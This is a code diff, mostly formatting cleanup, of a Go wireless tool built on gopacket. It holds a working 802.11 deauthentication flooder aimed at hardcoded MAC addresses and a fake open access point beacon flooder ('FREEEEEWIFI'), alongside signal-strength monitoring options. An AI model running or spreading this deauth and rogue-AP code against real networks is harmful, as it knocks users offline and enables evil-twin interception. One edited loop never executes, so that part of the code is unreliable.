@@ -7,6 +7,7 @@ import (
 	"os"
 	"os/exec"
 	"time"
+
 	//"io/ioutil"
 
 	"github.com/fatih/color"
@@ -27,15 +28,14 @@ var (
 	handle       *pcap.Handle
 	counter      int32 = 0
 	buffer       gopacket.SerializeBuffer
-  	options      gopacket.SerializeOptions
-	chartslice 	 []float64
-	openFlags      = 1057
-	fakeApRates  = []byte{0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c, 0x03, 0x01}
-	signal_power := []float64{}
-	var length float64 := 0
-	var total float64 := 0
-	count float64 := 0
-
+	options      gopacket.SerializeOptions
+	chartslice   []float64
+	openFlags         = 1057
+	fakeApRates       = []byte{0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c, 0x03, 0x01}
+	signal_power      = []int8{}
+	length       int8 = 0
+	total        int8 = 0
+	count        int8 = 0
 )
 
 // DEAUTH ---------------------------------------------------------------------------------------------
@@ -55,92 +55,95 @@ func Serialize(layers ...gopacket.SerializableLayer) (error, []byte) {
 func NewDot11Deauth() (error, []byte) {
 
 	handle, err = pcap.OpenLive(device, snapshot_len, promiscuous, timeout)
-    if err != nil {log.Fatal(err)}
-    defer handle.Close()
-	
+	if err != nil {
+		log.Fatal(err)
+	}
+	defer handle.Close()
+
 	radio_layer := &layers.RadioTap{
-		Length: 18,
+		Length:           18,
 		DBMAntennaSignal: int8(-10),
 		ChannelFrequency: layers.RadioTapChannelFrequency(2412),
 	}
 	dot11_layer := &layers.Dot11{
-		Address1: net.HardwareAddr{0x60,0xD0,0x2C,0x3C,0x10,0xC8},
-		Address2: net.HardwareAddr{0x48,0xd2,0x24,0x1a,0xcb,0xe8},
-		Address3: net.HardwareAddr{0x48,0xd2,0x24,0x1a,0xcb,0xe8},
-		Type: layers.Dot11TypeMgmtDeauthentication,
+		Address1: net.HardwareAddr{0x60, 0xD0, 0x2C, 0x3C, 0x10, 0xC8},
+		Address2: net.HardwareAddr{0x48, 0xd2, 0x24, 0x1a, 0xcb, 0xe8},
+		Address3: net.HardwareAddr{0x48, 0xd2, 0x24, 0x1a, 0xcb, 0xe8},
+		Type:     layers.Dot11TypeMgmtDeauthentication,
 	}
 	auth_layer := &layers.Dot11MgmtDeauthentication{
 		Reason: layers.Dot11ReasonClass2FromNonAuth,
 	}
-	
+
 	buffer = gopacket.NewSerializeBuffer()
-    gopacket.SerializeLayers(
-      buffer,
-      options,
-      radio_layer,
-      dot11_layer,
-      auth_layer,
-    )
+	gopacket.SerializeLayers(
+		buffer,
+		options,
+		radio_layer,
+		dot11_layer,
+		auth_layer,
+	)
 
 	outgoingPacket := buffer.Bytes()
 
-    for {
-	err = handle.WritePacketData(outgoingPacket)
-	fmt.Print(".")
-	if err != nil {
-	log.Fatal(err)
+	for {
+		err = handle.WritePacketData(outgoingPacket)
+		fmt.Print(".")
+		if err != nil {
+			log.Fatal(err)
+		}
 	}
-  }
 }
-// DEAUTH --------------------------------------------------------------------------------------------
 
+// DEAUTH --------------------------------------------------------------------------------------------
 
 func send_beacons() {
 	flags := openFlags
 
-    //Need high TX card with Atheros chip such as TP-Link
-    handle, err = pcap.OpenLive(device, snapshot_len, promiscuous, timeout)
-    if err != nil {log.Fatal(err)}
-    defer handle.Close()
-
-    radioLayer := &layers.RadioTap{
-    	DBMAntennaSignal: int8(-10),
-    	ChannelFrequency: layers.RadioTapChannelFrequency(2412),
-    }
-
-    dot11CoreLayer := &layers.Dot11{
-    Address1: net.HardwareAddr{0xFF,0xFF,0xFF,0xFF,0xFF,0xFF},
-    Address2: net.HardwareAddr{0x60,0xde,0xCA,0xAB,0xFC,0xda},
-    Address3: net.HardwareAddr{0x60,0xde,0xCA,0xAB,0xFC,0xda},
-    Type: 0x08,
-    }
-
-    dot11BeaconLayer := &layers.Dot11MgmtBeacon{
-    		Flags: uint16(flags),
-			Interval: 1000,
-		}
-
-    buffer = gopacket.NewSerializeBuffer()
-    gopacket.SerializeLayers(
-      buffer,
-      options,
-      radioLayer,
-      dot11CoreLayer,
-      dot11BeaconLayer,
-      Dot11Info(layers.Dot11InformationElementIDSSID, []byte("FREEEEEWIFI")),
-      Dot11Info(layers.Dot11InformationElementIDRates, fakeApRates),
-    )
-    outgoingPacket := buffer.Bytes()
-
-     for {
-	err = handle.WritePacketData(outgoingPacket)
-	fmt.Print(".")
+	//Need high TX card with Atheros chip such as TP-Link
+	handle, err = pcap.OpenLive(device, snapshot_len, promiscuous, timeout)
 	if err != nil {
-	log.Fatal(err)
+		log.Fatal(err)
 	}
-  }
-}
+	defer handle.Close()
 
+	radioLayer := &layers.RadioTap{
+		DBMAntennaSignal: int8(-10),
+		ChannelFrequency: layers.RadioTapChannelFrequency(2412),
+	}
+
+	dot11CoreLayer := &layers.Dot11{
+		Address1: net.HardwareAddr{0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF},
+		Address2: net.HardwareAddr{0x60, 0xde, 0xCA, 0xAB, 0xFC, 0xda},
+		Address3: net.HardwareAddr{0x60, 0xde, 0xCA, 0xAB, 0xFC, 0xda},
+		Type:     0x08,
+	}
+
+	dot11BeaconLayer := &layers.Dot11MgmtBeacon{
+		Flags:    uint16(flags),
+		Interval: 1000,
+	}
+
+	buffer = gopacket.NewSerializeBuffer()
+	gopacket.SerializeLayers(
+		buffer,
+		options,
+		radioLayer,
+		dot11CoreLayer,
+		dot11BeaconLayer,
+		Dot11Info(layers.Dot11InformationElementIDSSID, []byte("FREEEEEWIFI")),
+		Dot11Info(layers.Dot11InformationElementIDRates, fakeApRates),
+	)
+	outgoingPacket := buffer.Bytes()
+
+	for {
+		err = handle.WritePacketData(outgoingPacket)
+		fmt.Print(".")
+		if err != nil {
+			log.Fatal(err)
+		}
+	}
+}
 
 type Dot11ApConfig struct {
 	SSID       string
@@ -148,8 +151,6 @@ type Dot11ApConfig struct {
 	Channel    int
 	Encryption bool
 }
-
-
 
 func Dot11Info(id layers.Dot11InformationElementID, info []byte) *layers.Dot11InformationElement {
 	return &layers.Dot11InformationElement{
@@ -159,9 +160,7 @@ func Dot11Info(id layers.Dot11InformationElementID, info []byte) *layers.Dot11In
 	}
 }
 
-
 func main() {
-
 
 	rotate()
 
@@ -192,7 +191,7 @@ func main() {
 	prompt := &survey.Select{
 		Message: "\n",
 		Options: []string{"Start Monitor", "Show beacon statistics", "Send Test Beacons", "Print RTap-Power Chart",
-				  "Observe dBm Rates", "Calculate Average dBm"},
+			"Observe dBm Rates", "Calculate Average dBm"},
 	}
 
 	fmt.Print("\n")
@@ -229,22 +228,29 @@ func main() {
 	}
 
 	if option_select == "Observe dBm Rates" {
-	handle, err = pcap.OpenLive(device, snapshot_len, promiscuous, timeout)
-	if err != nil {log.Fatal(err)}
-	defer handle.Close()
-	packetSource := gopacket.NewPacketSource(handle, handle.LinkType())
-	for packet := range packetSource.Packets() {display_average_power(packet)}
-	}	
-	
-	if option_select == "Calculate Average dBm" {
-	handle, err = pcap.OpenLive(device, snapshot_len, promiscuous, timeout)
-	if err != nil {log.Fatal(err)}
-	defer handle.Close()
-	packetSource := gopacket.NewPacketSource(handle, handle.LinkType())
-	for packet := range packetSource.Packets() {calculate_signal_power(packet)}
-	}	
-}
+		handle, err = pcap.OpenLive(device, snapshot_len, promiscuous, timeout)
+		if err != nil {
+			log.Fatal(err)
+		}
+		defer handle.Close()
+		packetSource := gopacket.NewPacketSource(handle, handle.LinkType())
+		for packet := range packetSource.Packets() {
+			display_average_power(packet)
+		}
+	}
 
+	if option_select == "Calculate Average dBm" {
+		handle, err = pcap.OpenLive(device, snapshot_len, promiscuous, timeout)
+		if err != nil {
+			log.Fatal(err)
+		}
+		defer handle.Close()
+		packetSource := gopacket.NewPacketSource(handle, handle.LinkType())
+		for packet := range packetSource.Packets() {
+			calculate_signal_power(packet)
+		}
+	}
+}
 
 func display_beacons(packet gopacket.Packet) {
 
@@ -277,8 +283,8 @@ func display_beacons(packet gopacket.Packet) {
 			" \u001b[37mTX Attenuation: \u001b[35m", radioInformation.TxAttenuation,
 			" \u001b[37mDBTx Attenuation: \u001b[35m", radioInformation.DBTxAttenuation,
 			" \u001b[37mDBMTxPower: \u001b[35m", radioInformation.DBMTxPower,
-			" \u001b[37mAntenna: \u001b[35m", radioInformation.Antenna, " \u001b[31m Beacons Captured: ", counter) 
-			//"ESSID: ", dot11elementInformation.Info)
+			" \u001b[37mAntenna: \u001b[35m", radioInformation.Antenna, " \u001b[31m Beacons Captured: ", counter)
+		//"ESSID: ", dot11elementInformation.Info)
 
 		if dot11Information.Address3 != nil {
 			fmt.Fprintln(f, dot11Information.Address3)
@@ -289,7 +295,6 @@ func display_beacons(packet gopacket.Packet) {
 
 }
 
-
 func display_average_power(packet gopacket.Packet) {
 	radioInformation := packet.Layer(layers.LayerTypeRadioTap)
 	if radioInformation != nil {
@@ -299,20 +304,17 @@ func display_average_power(packet gopacket.Packet) {
 
 }
 
-
-func average_power(total float64, x float64) {
+func average_power(total int8, x int8) {
 	fmt.Println("Average AP dBm:", total/x)
 }
-
 
 func calculate_signal_power(packet gopacket.Packet) {
 	dot11Information := packet.Layer(layers.LayerTypeDot11)
 	radioInformation := packet.Layer(layers.LayerTypeRadioTap)
-	
-	if dot11Information != nil || radioInformation != nil {
-		dot11Information, _ := dot11Information.(*layers.Dot11)
+
+	if radioInformation != nil || dot11Information != nil {
 		radioInformation, _ := radioInformation.(*layers.RadioTap)
-		for count = 0, count++, count > 1000 {
+		for count := 0; count > 1000; count++ {
 			signal_power = append(signal_power, radioInformation.DBMAntennaSignal)
 			fmt.Print(".")
 			count += 1
@@ -321,10 +323,9 @@ func calculate_signal_power(packet gopacket.Packet) {
 			total += value
 			length++
 		}
-		average_power(total, length)		
-	}		
-}	
-		
+		average_power(total, length)
+	}
+}
 
 func printAChart() {
 
@@ -332,7 +333,6 @@ func printAChart() {
 	graph := asciigraph.Plot(chartslice)
 	fmt.Println(graph)
 }
-
 
 func printA() {
 
@@ -342,14 +342,12 @@ func printA() {
 	print_artwork()
 }
 
-
 func printB() {
 	clearscreen := exec.Command("clear")
 	clearscreen.Stdout = os.Stdout
 	clearscreen.Run()
 	print_artwork2()
 }
-
 
 func printC() {
 	clearscreen := exec.Command("clear")
@@ -358,7 +356,6 @@ func printC() {
 	print_artwork3()
 
 }
-
 
 func rotate() {
 	for {
@@ -419,7 +416,6 @@ func rotate() {
 		break
 	}
 }
-
 
 func print_artwork() {
 	color.Blue(`
